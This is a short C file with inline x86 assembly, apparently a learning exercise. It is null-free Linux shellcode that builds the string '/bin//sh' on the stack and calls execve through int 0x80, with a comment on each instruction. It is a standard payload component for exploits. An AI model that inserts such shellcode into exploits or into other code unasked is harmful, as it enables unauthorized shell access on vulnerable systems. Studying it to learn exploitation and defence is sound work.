
void main()
{
        __asm__ __volatile__(
                        "xor %eax, %eax         \n\t"   //Make Null value to avo
id 0x00
                        "push %eax              \n\t"   //add str end(NULL)
                        "push $0x68732f2f       \n\t"
                        "push $0x6e69622f       \n\t"	//add /bin//sh by little endian order
                        "mov %esp, %ebx         \n\t"	//Make "/bin/sh address var to add execve argument2 That's why argument2 have to double opinter(**) 
                        "push %eax              \n\t"	//add NULL and there is don't need to get null addr even argv2 format is **
                        "push %ebx              \n\t"	//add /bin/sh str pointer this moment make execve argv2
                        "mov %esp, %ecx         \n\t"	//make ecx to argv2
                        "mov %eax, %edx         \n\t"	//edx init to 0
                        "mov $0xb, %al          \n\t"	//eax init to 0xb to call execve
                        "int $0x80              \n\t"	//call interupt
                        );
}
~                                                                               
~               
